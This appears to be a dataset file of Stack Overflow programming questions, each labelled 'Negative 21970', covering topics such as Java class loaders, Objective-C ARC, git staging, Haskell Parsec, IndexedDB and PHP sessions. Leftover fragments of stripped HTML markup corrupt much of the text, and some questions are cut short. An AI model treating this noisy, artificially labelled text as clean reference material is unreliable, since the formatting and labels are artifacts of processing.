Negative 21970 pMy question is twofold.  First, Ill explain the problem, and second, assuming the solution is to implement a class loader, how to go about doing that on a web application.p  pMy problem is this  Our company is using a framework made by another company.  It uses xml files to generate web pages and these xml files are located within another library jar files.  It wasnt meant to be dynamic because these libraries are generated often weekly, but they determine how many fields there are, what type of information it collects datetime, combo box, etc., and so on.  p  pNow the question has been proposed by my company whether or not it would be possible to dynamically move these fields around by dynamic, I mean ideally you could refresh the page and see the effects of changes made to the layout.  I did a few preliminary tests and discovered that modifying the xml does give the desired effect on the web page, however, since these xml files are located in the jars, it means I have two possibilitiesp  ol liCreate a tool which modifies the jar outside of the scope of my web application, though this would obviously imply that it absolutely cannot be dynamic.  Moreover, Id have to create an interface aside from the web application in order to manage the tool.  Moreover still, I cant seem to shake the impression that this is an incredibly hacky approach and that I should probably avoid this solution at any cost.li liI implement a class loader specifically codegetResourceAsStreamcode and when I see a call to load one such xml file, rather than do the default behavior, I generate the xml file based on the original, modifying information as I require, then returning the resource to the caller which in this case would be the thirdparty framework.  li ol  pFirst question is, is 2 my best option or do there exist other options or should I stick to 1  p  pMy second question is, assuming I should implement my own class loader, how best can I do this on my web application  Im using Tomcat 7, but if possible I would like the solution to be independent of which web container Im using.  p  pAny help would be greatly appreciatedp

Negative 21970 pIm facing a requirement to create a static method on my base class,  but dont like that I have to declare type arguments, so Im wondering if Im going about this the right way.p  pBasically, Im assigning delegates that Ill associate with properties on the class.  I could easily put the method on the inherited classes, like sop  precodepublic class Foo      public string Property1  get set    public class InheritsFoo  Foo       public void AssignDelltTValgt         ExpressionltFuncltInheritsFoo, TValgtgt expr,          ActionltInheritsFoo, TValgt action             codepre  pOr, in an extension class, I could do thisp  precodepublic static void AssignDelltT, TValgt     this T source,      ExpressionltT, TValgtgt expression,      ActionltT, TValgt action      where T  Foo    codepre  pBoth of these would enable me to use codeAssignDelcode in an instantiated classp  precodevar foo  new InheritsFoo foo.AssignDelx gt x.Property1, handler codepre  pBut I have a requirement to make codeAssignDelcode static. This makes the extension way of doing it useless. It still works in codeInheritsFoocode, but I really want to move this to the base class. If I try, the generics argument cant be inferred, and I have to change the usage of the methodp  precodeInheritsFoo.AssignDelltInheritsFoo, stringgtx gt x.Property1, handler codepre  pIs there a way out here, another way of doing this I havent thought ofp  pEDIT to address the issue in the comments about whether or not the extension method wouldshould work... I went to the url referenced by Mark M.  Turns out that if I write it as such...p  precodeInheritsFoo foo  null foo.AssignDelx gt x.Property1, handler codepre  pThat compiles dont know if it will run, though.  Still, dont think that qualifies as using a static method, since foo is still considered an instance  A null instance, but an instance nonetheless.p

Negative 21970 pOkay so Ive been happily using ARC in my project until I attempted to add some third party code to my project. I dragged the folder in not a project file, just some viewcontroller source files. The 3rd party code was not ARC so I did strongEditRefactorConvert To ObjectiveC ARCstrong and choose ONLY the files from the 3rd party app to convert to ARC. Everything went swimmingly but I started getting the following warning in MY previously working codep  precodeTTKSoundGenerator.m9410 warning bridge casts have no effect when not using ARC [Warcbridgecastsdisallowedinnonarc]         bridge CFStringRefsoundFile,           1 warning generated. codepre  pThis is the first clue that something is amiss. I go ahead and build and run and sure enough the app crashes where things are getting released while still being referenced. So ARC is not working at all despite the fact that the strongObjectiveC Automatic Reference Countingstrong is set to strongYESstrong in project file.p  pI went back and did strongEditRefactorConvert To ObjectiveC ARCstrong on ALL the files in the project hoping to rectify this but no dice. So now the project is stuck in ARC limbo. It seems like unselecting files when doing the refactor somehow told Xcode to add a special case of No ARC to those files. Any ideas on how to fix or further diagnose thisp

Negative 21970 pThe book Pro Git says that the staging area was just an list, or index, that says which files will be committed when a codegit commitcode is done, and now the name codeindexcode is more commonly known as the staging area.p  pBut if we modify the file codefoo.txtcode that is already part of the repo, and use codegit add foo.txtcode to stage it, and modify the file again, now the file is both staged and modified as seen in codegit statuscode, and if we commit, the staged version will go into the commit.  The second edit wont go in.p  pSo how can the staging area keep track of what the first edit was if it is just an index  a list of filesp
Negative 21970 pemedited the question to improve clarity.emp  pI am trying to learn SOAP based Java Web services. I created a simple web service using the WebService annotation. I published it in my local machine and I consumed the service in my local machine. I found out that the WSDL file is auto generated and the SOAP messages are under the hood. I was able to track the SOAP messages only through TCPIP monitor.p  pI later found that Java SOAP API give the option to create SOAP messages ourselves and transmit them using classesinterfaces like MessageFactory and SOAPMessage. p  pMy question is, if WSDL and SOAP messages are generated and handled automatically, why would we need SOAP handlers to manually create and send SOAP messages using the Java SOAP APIp

Negative 21970 pI Understand the usage of the mmap. Considering simple readwrite operation on the file, involves, opening the file, and allocating the buffer, read [ which requires context switch, ], and then the data available to the user in the buffer, and changes in the buffer will not reflect into the file unless it is written explictly.p  pInstead , if we use mmap, writting directly to the buffer is nothing but writting into the file.p  pThe Questionp  p1 File is in the hard disk, mmaped into the process,  Each time i write into mmaped memory, strongis it written directly to the filestrong. In this case, strongdoes not it require any context switchstrong, because, the changes are done directly into the file itself. strongIf mmap is faster than legacy file accessing, where we see the time savingstrongp  pKindly explain. correct me if i m wrong also. p
Negative 21970 pI ran into a situation with StreamInsight where I have 1 input source with different types of events that need to be treated differently, but are eventually matched with other events from the same source.p  pI created a MUCH simpler scenario below where an input source generates random numbers for simplicity sake, 1s and 0s.  If the number is even, we want to save it until further notice unknown duration.  If the number is odd, we want to match it with n1 from the even stream and then remove n1 from the even stream.  If there is no match, the odd number is simply processed through as is with no further calculation.  I have everything working as expected up to the point of removing a matching n1 from the even stream.  A match is made, and the match gets pushed to the output adapter, but remains available for another join to be made to the given event.  What I have gathered of several days worth of experimentation and research, is somehow I need to clip the even stream event duration ClipEventDuration, presumably as part of the filter in GenerateEvenJoinQuery, however, everything I have tried has produced no change, or undesired results.  I have also tried changing the evenStream to an Interval shape with even less luck.  Any help or suggestions would be greatly appreciated.p  pFor example, given a simplified list [ 1, 0, 1, 1, 0, 0, 1, 1, 1 ]p  pI would expect the output to look like [ 1, 100, 1, 100, 100, 1 ]p  pI would also be accepting of as the real scenario Im working with, the first output isnt actually possible Note the 2nd and 3rd 0s are joined to a single 1.

Negative 21970 pI have the following problem. There is a Cocoa app I have with UI, nib, etc. I need to be able to start the application in background or in foreground. In other words, I need NSApplicationActivationPolicyProhibited in the former and NSApplicationActivationPolicyRegular in the latter.

If I put LSBackgroundOnly to 1 everything works as expected. But if I put it to 0 or do not put the key, when the app starts it shows up the icon of the app in the dock for a couple of miliseconds and a little flash. I guess this is  because the app is initialized with the default policy starting to show the icon and I switch it to background too late. This is also explained in a hrefhttpstackoverflow.comquestions12948539cocoagotoforegroundbackgroundprogrammatically1298106812981068Cocoa  go to foregroundbackground programmaticallyap  pI know places WHERE to read the argument and do the previous IF even before I start cocoa or the app for example, I can hook in MyOwnPrincipalClass initialize, but even with that even if I set the policy it looks like the startup of Cocoa will set the default one. So it doesnt work.p  pThe only solution I found is to put my IF at the beginning before initialize cocoa and depending on the argument, I writemodify the Info.plist LSBackgroundOnly flag. This could work but it is a real hack. I would like to find a cleaner solution. p  pBTW, if I do the other way around start up always as background and then make it foreground has a worst result since when going foreground the menubar of the app is not shown up automatically you need to switch to another app and come back to make it appear....I searched in the internet and indeed it looks like a known buglimitation. p  pBTW2 having 2 different binaries is not an option either. p  pThanks for any help you can give me,p

Negative 21970 pIm trying to write a parser in Haskell using the Parsec package. One part of the rules for the input requires the parser to match an option of rules. Out of the rules more than one rule may be match, but emat leastem one rule must match or the parser is expected to produce an error.p  pLet me provide an example. Assume we have two Parsec rules named codefirstcode and codemorecode. It is possible thatp  ul lithe input matches codefirstcode followed by codemorecodeli lithe input matches only codefirstcode or thatli lithe input matches only codemorecode.li ul  pIn any case, at least one of codefirstcode or codemorecode must match. Any ideas on how to do this I thought about using the codeltgtcode but if I understand it correctly it will only match emoneem of the rules i.e. the first one that is successful.p  pstrongEDITstrongp  pClarification If both codefirstcode and codemorecode matches, the result of both must be returned. If only one matches, the returned value of the other can be some null value like codeNothingcode, but it is not allowed to return codeNothingcode for both codefirstcode and codemorecode.p
Negative 21970 pI been developing this Point of Sale system for almost a month and been stuck in finding a way to implement an offline support for my application. I want to use IndexedDB but having problems in what data should be loaded initially to the application. p  pLet me give you a scenario.p  pI started a transaction and entered some items. Unfortunately, the wrath of Thor destructed a tower which caused network disconnection while I am in the middle of transaction. p  pWith that scenario, how should I structure my applicationp  pA. Put all entries directly to the MySQL db and use IndexedDB for offline entries. Problem initial entries will never be brought back after disconnection.p  pB. Use the HTML5 as the primary db for cashier transactions and transfer it only to the MySQL db after successful checkout. Problem a large amount of data will be stored to IndexedDB on system load.p  pI am considering option B but cant find a way to minimize the size of preloaded data from the MySQL db. Why do I need to load these data The only thing that identifies the item is throught the item code. I have thousands of items in the MySQL db and loading them into IndexedDB is overkill. I need to fetch the description, unit price, tax rate, discount rate, promo availability, and stock count of every item upon entry. Real time monitoring is also vital. If all of these data will be loaded to IndexedDB, 5mb is not enough.p  pThank you so much for your responsesp

Negative 21970 pI am facing a really weird issue here.p  pI have two websites codeA and Bcodep  precodeA is the landing page a micro website. A is running Joomla.  B  payment pages. Coded with CodeIgniter.

Then he is taken to the payment page website strongBstrong and starts filling in his application form.  Once he is done, he is taken to a payment gateway provided by SecureTrading and makes a payment. After a successful payment, a user is taken back to website strongBstrong, where he has to finish the last bit of his application.p  pstrongProblemsstrong After a successful payment, user is redirected back to website strongBstrong, but for some reason all session data is lost.p  pstrongWhen does this happenstrong Session data is lost only when a user is coming from the landing page strongAstrong.

But numeric literals as code0b00000000code are treated as int. This leads to the fact, that there is the conversion of a larger signed integer type to an smaller unsigned integer type in the end. It may have an undesirable side effects. There is no suffix to denote an unsigned integer type with size of one byte in strongCstrong. How can I avoid this using a pure strongC11strong I dont want to use codestaticcastcode and the others, because this leads to code bloating multiple parentheses and at least one symbol to name the codestaticcastcodewrapper function. The solution could be to use a userdefined literal, say code0b00000000opcode, that looks better than codeo0b00000000code.

Negative 21970 pTwo part questionp  pstrongNumber 1strong What is the best approach in creating a model for an object that references another object, when some of the propertiesattributes of the referenced object are not always necessaryp  pImagine if you have two objects strongPERSONstrong and strongBUSINESSstrongp  precodePerson  PersonID  Name  Age  Sex  Skill  Business   Business  BusinessID  Name  Address  CorporateVision this is large codepre  pIn the example above A strongPERSONstrong has a reference to a strongBUSINESSstrong as their current employer.p  pIn the database, I would have two tables for each object.  While in code, using the MVC architecture pattern, I would have two classes for each object.   The database would have a foreignkey relationship between strongBUSINESSstrongstrongPERSONstrong, while in code the strongPERSONstrong object would have a member variable that holds a reference to a strongBUSINESSstrong object.p  pNow lets say I want to enumerate on a collection of strongPERSONSstrong and find out the total number of those that work for a specific company based on strongBUSINESSstrong . strongNamestrong.p  pWithout using MVC, I could just create a function that would query the database and get a count.  Simple and efficent.p  pWITH MVC, I need to instantiate every strongPERSONstrong object, which in turns, instantiates a strongBUSINESSstrong object for the reference if one was not already done for it... the strongBusinessFactorystrong would check a collection first.  Furthermore, it MUST pull in strongBUSINESSstrong . strongCorporateVisionstrong from the database for every object.  And because most of these businesses are Media Marketing Companies, most of their corporate visions are large text blobs.  So it is very unnecessary to read CorporateVision from the database when all we need is the name of the business.p  pI could solve this problem by having changing the strongPERSONstrong object in code top  precodePerson  PersonID  Name  Age  Sex  Skill  BusinessID  BusinessName codepre  pSo now when I create my strongPERSONstrong object, I do a JOIN with strongBUSINESSstrong and cache the name.  Now I can get the BusinessName quickly and efficiently... and I still can get the full strongBUSINESSstrong object as needed by doing a lookup on the ID.  But I just denormalized the model... and I just introduced a new problem... and a new question.p  pstrongNumber 2strong How does MVC handle concurrency with a multiuser databasep  pLets say while my client application is enumerating using the enumeration that I mentioned above that finds all people that work for a particular business, another user merged two of the strongBUSINESSstrong objects.p  pNow my inmemory collection is wrong because all of the BusinessName caching is stale.  The same could be true if I had just left the strongPERSONstrong . strongBusinessstrong as a strongBUSINESSstrong object reference The strongBUSINESSstrong object would be stale.p  pstrongIn summarystrong I feel that with MVC I lose data retrieval efficiency as well as the loss of the ACIDness of my application.  Or am I using MVC wrongp

Negative 21970 pMy app is downloading base64 encoded content, in most cases PDF documents. It is transferred via web service and wrapped up in SOAP. The documents can reach sizes of up to 100 MB.p  pTo store these files locally, I need to extract them from the SOAP envelop, decode the base64 string and write to storage.p  pProblem is, that a document of about 1 MB increases the temporary memory usage by 2030 MB. When tracking allocations in Instruments, I can see those peaks. This isnt so much a problem. But a document of 60 MB increases memory by around 800 MB, and thats definitely too much for iOS devices.p  pIm trying to change the app so that the peaks can be prevented or at least lowered. Alas, I dont exactly know which lines of code are responsible.p  pIs there a possibility to step through the code and also view current allocations or memory usage at the same timep  pI know stepping through doesnt work when app is executed by Instruments. So, are there any other optionsp  pHere is how Instruments looks like img srchttpi.stack.imgur.come2tWo.png altenter image description herep  pThanks in advancep

Negative 21970 pIve implemented input validation on all of my input data using php as well as js on the frontend. Im type casting where I can, validating stuff like emails against a regex, making sure dropdown values are only ones Im expecting and also in many cases where Im expecting only a string I have a regex that runs that only allows letters, numbers and spaces. Anything that doesnt meet these rules results in the form failing validation and no sql queries are run.p  pWith that said if my form passes validation Im making the assumption that its safe for input in to my db which Im doing via pdo and then escaped on output.p  pSo with that said why do I need input sanitizationp

Is that correctp  p3 Also I noticed that in Mediawiki, the userpages have different types of URL. For example, sometimes its like wikiindex.phpUserXYZ or wikiindex.phptitleUserXYZ or wikiindex.phptitleUserXYZampactioneditampredlink1, etc... So in that case, do I need to add different htaccess redirect rule for each type of urlssp  p4 Is there another method like adding a redirect rule in LocalSettings.php or something elsep  p5 What is the right method for doing thisp  pI am stumpedp

Negative 21970 pI am working on a system where users are able to submit HTML to the system, and then preview the resulting page.

I noticed that null properties or objects were throwing exceptions NullReferenceException so I changed my mapping doing something like thisp  precode.ForMemberdest gt dest.DestinationCity, opt gt opt.MapFromsource gt source.DestinationAddress  null  source.DestinationAddress.City  null  string.Empty  source.DestinationAddress.City .ForMemberdest gt dest.DestinationStreet, opt gt opt.MapFromsource gt source.DestinationAddress  null  source.DestinationAddress.Street  null  string.Empty  source.DestinationAddress.Street .ForMemberdest gt dest.DestinationPostCode, opt gt opt.MapFromsource gt source.DestinationAddress  null  source.DestinationAddress.PostCode  null  string.Empty  source.DestinationAddress.PostCode .ForMemberdest gt dest.DestinationCountry, opt gt opt.MapFromsource gt source.DestinationAddress  null  source.DestinationAddress.Country  null  string.Empty  source.DestinationAddress.Country .ForMemberdest gt dest.DestinationProvince, opt gt opt.MapFromsource gt source.DestinationAddress  null  source.DestinationAddress.Province  null  string.Empty  source.DestinationAddress.Province .ForMemberdest gt dest.DestinationState, opt gt opt.MapFromsource gt source.DestinationAddress  null  source.DestinationAddress.State  null  string.Empty  source.DestinationAddress.State codepre  pWith this solution everything works but I dont think its particularly elegant. Another thing Ive noticed is when I load a customer with a null address  for some strange reason  its still quite slow compared to the object with the address set.p  pI was wondering if theres a better alternative.p  pPS p  pIve tried to measure performances. A fully loaded object takes an average of strong000000.0003993strong to be loaded. An object with some null properties  takes an average of strong000004.5745887strong.p

Injector injector  GWT.createInjectorserviceLocatorModule           injector.getInstance returns a fullyconfiguredwired          DefaultSignInOutService instance.         setSignInOutServiceinjector.getInstanceSignInOutService.class           Override     public Object getInstanceClassltgt clazz           Im trying to use proper DI best practices here, and avoid code like                   return new DefaultSignInOutServicetrue, Yes, 35                   Rather, Id like to be able to return an already preconfigured service impl         return signInOutService            Getterssetters, etc.  codepre  pMy emunderstandingem is that the codeServiceLocatorcodes are basically factories for service implementations. If thats true, then if Im using Guice for serverside DI, I need to initialize my Guice module from inside the locators constructor. However, if there is any code that I need to write myself elsewhere in the app that creates an instance of codeDefaultSignInOutServiceLocatorcode and calls its codegetInstancecode method explicitly, then I dont need to put the codeServiceLocatorModulecode inside codeDefaultSignInOutServiceLocatorcode. In that case, I could have code like thisp  precodepublic class DefaultSignInOutServiceLocator implements ServiceLocator      Injected     private DefaultSignInOutService signInOutService      Override     public Object getInstanceClassltgt clazz          return signInOutService            Getterssetters, etc.  codepre  pSo here are my questionsp  ol liAre codeServiceLocatorcode impls an appropriate place to put Guice modules and thus bootstrap DI from inside them Otherwise, how can I inject the locator with a properlywiredconfgured service implli liOr, am I just not understanding the purpose of codeServiceLocatorgetInstancecodeli liAnd if I am on the right track here, then what scope Spring DI terminology should the injected codesignInOutServicecode be Should it be a singleton or a multitonprototype Do I need to worry about threadsafety here multiple threads obtaining the same codesignInOutServicecode instance Or does GWT somehow ensure that the RequestFactoryServlet accesses locators in a threadsafe wayli ol  pThanks in advancep

Negative 21970 pI have some code that accesses articles in PubMed and parses some information from each XML. The program works fine on my computer, but needs a lot of time to finish. So when i run it on a unix machine especially for this kind of things, every request i make is blocked. There is a limit to how many can be made each minute before the machine considers it a virus, but that is not the problem, as all the requests are blocked. I checked and this happens only with requests at the PubMed site.p  pThanks in advancep  pEDIT I use jsoup for connection. Running wget with ProcessBuilder from my program works without getting blocked but then efficiency becomes an issue because the output from wget can only be read with codewhilebr.readline  nullcode and this ads a lot of run time.p

Negative 21970 pThe situation is that I have a layout codeapplication.gspcode that defines the layout for all the pages except the login page. Inside the layout is a header that should display the name of the current logged in user Spring Security plugin. The problem is that if the user just registers or uses oAuth for the first time same as registering then when he logs in he will see and empty spot instead of a username because the layout was rendered strongbeforestrong the username was available. If he logs outlogs in again he will of course see his username.p  pP.S. Moving the header outside of the layout is not an option, because it will cause massive code duplication.p  pIs there a way around thisp

Negative 21970 pIm new to sessions, and since i need to use a whole bunch of them right now it seemed inevitable to create a problem.p  pI was told to make a Card game BlackJack using only PHP and HTML. So far so good, got the cards and everything in it, start, hit, stand and reset work all fine.p  pI did this by using forms. A form for start a form for hit and a form for Stand. And by using sessions it reminded all the cards it had and the score.p  pBut the problem came when i started inserting a bet system. I started with a standard bank which is 100p  pI have an input field in my start form aswell which is where the bet will be placed. And when the user click on the start form it will call this function among some othersp  precode Calculate the bank function calcbank     SESSION[bet]  POST[bet]    SESSION[bank]  100  SESSION[bet]  codepre  pAnd this one works as well, it will echo out 95 when the user clicks start minimal bet is 5. And when the user clicks hit, it will go to the hit form, remember all sessions and show 95 as well, same with stand.p  pAnd here is my problem, when say, i bust by pressing hit and getting 23 points. Nothing happens to the SESSION[bank] and the bet will stay 95. But when the user changes his next bet to say 20. And click start it will calculate the bank again, and as you can guess, it will take the standard 100  20 and make the SESSION 80, while it shouldve been 75.p  pI really hope I explained my problem clearly enough for you guys, If not please tell mep  pThanks in advancep

Negative 21970 pThe C Standard library provides the following guarantees about its types unless stated otherwisep  p1 Read operations i.e. working on a codeconstcode object are threadsafe. That means multiple threads may read from an object at the same time without race conditions as long as no thread is writing applying a noncodeconstcode operation to the object at the same time. p  p2 Multiple threads may read and write arbitrary objects at the same time as long as each object is only accessed by at most one thread at a time. p  pThe standard library requires the same guarantees by user types. You can read about this stuff in a hrefhttpherbsutter.com20140113gotw95solutionthreadsafetyandsynchronization relnofollowGotW 95a or watch a hrefhttpchannel9.msdn.compostsCandBeyond2012HerbSutterYoudontknowblankandblank relnofollowHerb at C and Beyond 2012a explaining about this.p  pNow my question is, if the following conclusion is correct Since the codeoperatorcode of codestdfunctioncode is a codeconstcode member function, it is required to be threadsafe. If the functor passed in at construction has a const codeoperatorcode member function, then the codestdfunctioncode object can assume it to be threadsafe and just forward the call. However, if the functor passed to it at construction has a mutable codeoperatorcode, then this operation does not need to be threadsafe, but codestdfunctioncode still needs to be, because the call operator remains const. Hence codestdfunctioncode must externally synchronize calls to the stored mutable functor and hence use a mutex. This implies a performance overhead in case of passing mutable lambdas to the constructor of an codestdfunctioncode. p  pIs this reasoning correct If so, are current implementations compliant p

Negative 21970 pI am working on a set of email templates which lets users add text, images, change font and colours, etc. Now if the user wants to add an image in a specific area of the template, they will first click on that area where they want the image to be added and then add an image from the library in my application. Now lets consider that the acceptable dimensions of the area they clicked on the template is 500  500, and the image selected from the library is 1000  1000, in such a case the application will automatically bring up a cropping tool using which they can resize the image. However, I want to restrict the cropping tool to only be draggable to the minimum height OR width of the desired location in the template, i.e., in this example, they should not be able to drag the cropping tool any further below the height OR width of 500, although they can keep one or both dimensions above 500 as the cropping tool automatically resizes it back to 500  500 for e.g. 800  500, or even 500  1000 is acceptable too as the cropping tool automatically resizes the image to fit in the template. I had a look at the a hrefhttpdeepliquid.comcontentJcropManual.html relnofollowdocumentationa and a hrefhttpstackoverflow.comquestions346045jqueryjcrophowtosetafixedsizeselectionareathis questiona but couldnt really find a suitable answer to my question.

Negative 21970 pthis is my first question, which I cant figure out how to make relevant to other people as per the guidelines. I suppose just a question at the end as to whether a noob should ever attempt to meddle with code they dont fully understand.p  pMy site depends on an xml database generated elsewhere which is spliced into sitespecific format, set up by the original developer. The system generating the database changed a tag from contact to person, breaking the data formula for the splicing. Grr.p  pI emthoughtem I had fixed it, because I changed the tag in the receiving file, but the splicer has just stopped completely. Basically, I dont really know enough about the sitecoding to have attempted to make these changes.

While I can drive the app and take screenshots, it seems like the objects on screen are not visible to the tool because of how they are generated from Unity, and not from Xcode itself. Ive tried checking what objects are visible with thep  precodelogElementTree codepre  pfunction, but all it returns is a rect object with a static image emincluding the buttons and things I would like to be able to access, but the program does not recognize as xcode objectsem.

Negative 21970 pThis might not be the proper place to ask this since it seems the issue is with the actual image, but Im hoping someone here has seen this issue before. p  pI am loading images from a server. First I take the photo, upload it from the server and then view it in a different part of the application. This is when I saw that the aspect ratio of any image I had just uploaded was way off. See image one below. Images that I had uploaded in the past did not have these issues. The difference is that I had to pull the previous images into photoshop to rotate them. p  pI got my node.js server to orient them for me but then when I load them up in the UIImageView they are squished and stretched. Viewing them in the browser or on my computer shows them as normal. Out of curiosity I opened one in photoshop, did not manipulate it at all and saved it out. When I uploaded it to my server and viewed it on the iPhone again it looked as it should. See the second image below.p  pAgain all other images load just fine but the ones that did not go through Photoshop come out all wonky.p  pAny thoughts Thanks in advance for your help.p  pimg srchttpi.stack.imgur.comIP1R0.png altenter image description herep  pimg srchttpi.stack.imgur.comZ89yf.png altenter image description herep  pstrongEDIT strong When viewing the photos in the browser they are also stretched when resized.

Negative 21970 pIm writing a program that has both a commandline interface and an interactive mode. In CLI mode it executes one command, prints results and exits. In interactive mode it repeatedly reads commands using GNU readline, executes them and prints results in spirit of a REPL.p  pThe syntax for commands and their parameters is strongalmoststrong the same regardless of whether they come from commandline or frmo stdin. I would like to maximize codereuse by using a single framework for parsing both commandline and interactive mode inputs.p  pMy proposed syntax is square brackets denote optional parts, braces repetition as follows  p  ul lipFrom shell p  precodeprogramname [GLOBAL OPTION] ... ltcommandgt [ltcommand arggtltGLOBAL OPTIONgtltLOCAL OPTIONgt ...]   codepreli lipIn interactive mode p  precodeltcommandgt [ltcommand arggtltGLOBAL OPTIONgtltLOCAL OPTIONgt ...] codepreli ul  pLocal options are only valid for one particular command different commands may assign a different meaning to one option.p  pMy problem is that there are some differences between the CL and interactive interfaces Some global options are only valid from command line like help, version or configfile. There is obviously also the quitcommand which is very important in interactive mode, but using it from CL makes no sense.p  pTo solve this Ive searched web and hackage for commandline parsing libraries. The most interesting ones Ive found are cmdlib and optparseapplicative. However, Im quite new to Haskell and even though I can create a working program by copying and modifying example code from library docs, I havent quite understood the mechanics of these libraries and therefore have not been able to solve my problem.p  pI have these questions in mindbr How to make a base parser for commands and options that are common to CL and REPL interfaces and then be able to extend the base parser with new commands and optionsbr How to prevent these libraries from exiting my program upon incorrect input or when help is usedbr I plan to add complete i18n support to my program. Therefore I would like to prevent my chosen library from printing any messages, because all messages need to be translated. How to achieve thisp  pSo I wish you could give me some hints on where to go from here. Does cmdlib or optparseapplicative or some other library support what Im looking for Or should I revert to a handcrafted parserp
Negative 21970 pI am trying to see if in 2014, were at a place where returning a JSON or XML document via a rest service from say, JAXRS spring implementation will be compatible when used by another library possibly in another language If I write a Windows mobile .net client that consumes my Java JAXRS api, will the way the JAXRS returns the json andor xml convert correctly in the .net client Or are there issues with various languages and librariesp  pI ask this because in one case in particular, we return a collection of items, and in XML it will result in thisp  precodeltitemsgt   ltitem attrvaluegtanother valueltitemgt   ltitem attrvalue2gtanother value2ltitemgt ltitemsgt codepre  pThe resulting JSON looks something likep  precodeitems [    attrvalue,valueanother value,    attrvalue2, valueanother value2   ] codepre  pHowever, in using online xml to json and json to xml.. when I paste the above XML and get the above json conversion.. then past the json above into the json to xml converter.. the xml is different.. it becomesp  precodeltitemsgt   ltitemgt     ltelement attrvaluegtanother valueltelementgt     ltelement attrvalue2gtanother value2ltelementgt   ltitemgt ltitemsgt codepre  pMy concern is that on our service side code.. we use a library to take the incoming xml or json and turn it in to an object. If the above XML were to be sent due to some client side marshalling it like that.. our server side would throw exceptions.. not able to handle the  type. p  pI also see in some cases JSON that converts xml attributes into attrNamevalue.p  pSo.. is there any way to ensure that the json and xml we return is correct and can be readparsed by any client Are there some things we should document with regards to the emtypeem of json being returned that would give hints on how to properly configure a different library to make sure to marshal the same json from the data I see for example in the Eclipse Moxy, there are some configurations that can be set. p  pIn my past, I simply used Jersey with JAXRS and it handled json and xml for me.. I never thought about issues like different consumer libraries converting what my JAXRS sends out into something not compatible, especially in a case where for example they use our XSDs to generate POJOs in their languagelibrary of choice, that may not match with what our XSD to POJO generates.p

Negative 21970 pso I have a dictionary containing values that are a class containing a list of doubles, and Im trying to get a specific number value from the list contained within the dictionary for every value in the dictionary. What I mean is that for each item in the dictionary, I want the 8th item in its list value, for example. Heres the code I havep  precodeforeach KeyValuePairltint, ListClassgt pair in MyDictionary      pair.Value.MyList[7]  codepre  pmy list class is definition looks like thisp  precodepublic class ListClass      public Listltdoublegt MyList  new Listltdoublegt  codepre  pThis line trying to get the 8th value in the list has an error, and Im not sure how to correct it. The error says Only assignment, call, increment, decrement, and new object expressions can be used as a statement. Ive also checked to make sure the dictionary has all the information it needs to do this, all its lists have over the 8 doubles needed. Im sorry if this seems like a simple problem, Im new to programming and am at a loss. Any help would be appreciated, thanks.p

Negative 21970 pI have been looking for this answer here and in google without any success.

Every form as you can imagine has his submit button.  Now what Im trying to do without any success is to send one of this form to my controller, but not the whole list of A that I render but A. So my controller will look something like.p  precode   RequestMappingvalue  save, method  RequestMethod.POST          public final ModelAndView saveModelAttributea A a  codepre  pBut Im receiving a IllegalStateException Neither BindingResult nor plain target object for bean name because the render name of my modelAndView aList is not the same than a.p  pWhat I think I understand is that Spring MVC components like form dont allow submit a different class that was used in the render. Even if is a nested class of the render class, what is too bad.p  pI would like to avoid have to send the aList again.p  pAny ideap  pRegards.p

Negative 21970 pI am trying to create a new project and I am running into all kinds of issues and I am not sure why I downloaded the SDK from developer.android.com, opened the SDK manager and downloaded the build tools for 19.1 and I have 20 installed I think that is the new stuff Google just released. Then I opened Eclipse I get Eclipse Juno splash page instead of android development tools splash page, not sure if this changed in the recent update. Then I went to Help  Install new software and installed from this url dlssl.google.comandroideclipse Finally I went to Help  check for updates to make sure all of my stuff was up to date and no updates were found.p  pSo I went to start a new project and selected the following 1. New Android Application Project 2. Selected API 19 4.4 KitKat for Minimum, target and compile with SDK. 3. Theme Holo Light 4. Uncheck create custom launcher 5. Make sure create activity IS checked, everything else left alone 6.  Create activity checked on next screen and selected Blank Activity 7. Activity Name and Layout Name left as defaults. 8. Click finish.. and no MainActivity.java is created my src folder is emptyfp

Negative 21970 pOkay, so lets say I have a post slug called deals. I would like to know if it is possible for me to allow visitors to see that slug and the brief post descriptions in it, but not actually access the full posts themselves unless they are logged in Is there a plugin that can achieve this Or some code Thanksp  pEdit This question isnt as cut and dry as many of you seem to think it is. Im not looking for a page restricter. I want something that automatically restricts posts under a slug, but not the slug itself...p

Negative 21970 pAfter upgrading to ExtJS 5 from 4.2.1 I discovered a grid cell width calculation issue or what appears to be an issue.p  pHere is an example of the columnsp  precodecolumns [      header One, dataIndex one, flex 2 ,      header Two, dataIndex two, flex 2 ,      header Three, dataIndex three, flex 3  ] codepre  pThe headers fill the grid width as expected but grid cell widths are not equal to the headers in amounts of 5px  5px  12 px respectively.p  pThe appearance is as if there is room for a scroll bar but the grid has only one row. Grids that have enough data to have a scroll bar do not appear to have this issue.p  pResizing the grid column puts things back in a proper alignment until new data is loaded and rendered again with the width calculations off. It resizes soon after a new data load.p  pI thought that maybe css was to blame but changing themes did not fix it nor did using extall.css rather than the debug css.p  pIs this a bug or have I missed a new config that will correct the width calculationsp  blockquote   pIf this is a bug ... any suggestions for a work aroundp blockquote  pHelp much appreciated.p  blockquote   pUPDATE 1p      pI used Sencha Cmd to generate a basic app and created a grid view with the columns and a features.   So far it looks like having a grouping feature seems to be the culprit.   However, I do see the behavior on grids without a grouping feature.   Those grids are in a border layout so Ill investigate that next.p blockquote

Negative 21970 pI am looking for a place to put my clean up code e.g. releasing file handles, shutting down services.p  pHere is the scenario I have an app with multiple activities and a service running in the background. The service accesses a lot of sensors and files. Thus, it must be stopped if the app is terminated by the user to prevent battery draining. However, the service must continue running while the app is in the background andor the screen is turned off. I am looking for a place to stop the service in code. onDestroy of my Activities seems not to be a good idea because Android may call it even while my app is running or may call it never at all. p  pIs there a good place for releasing used resources of an app when the user knowingly terminates itp

I need practice in both areas so why not create a java program about science  Anyway, Ive got to the stage where I need to get the last 2 items in the String and change them to an integer and then I think I need to do algebra in java to solve a little equation for getting the little number infront of the letters. Thats all I need to do then I can carry on making my program D. Any help is very much appreciated and if you see anything else please point it out.

Negative 21970 pI have created a RootViewController class. In this class, i have events listening for user logging success and then present view controller to login page.

When i click on logout button, i dismiss the current view controller and then try to present the RootViewController again so that RootViewController class can present the login screen back again to the user. But, when i touch the logout button then just white blank screen shows up instead of login page. On the console, it outputs the below warning messages.

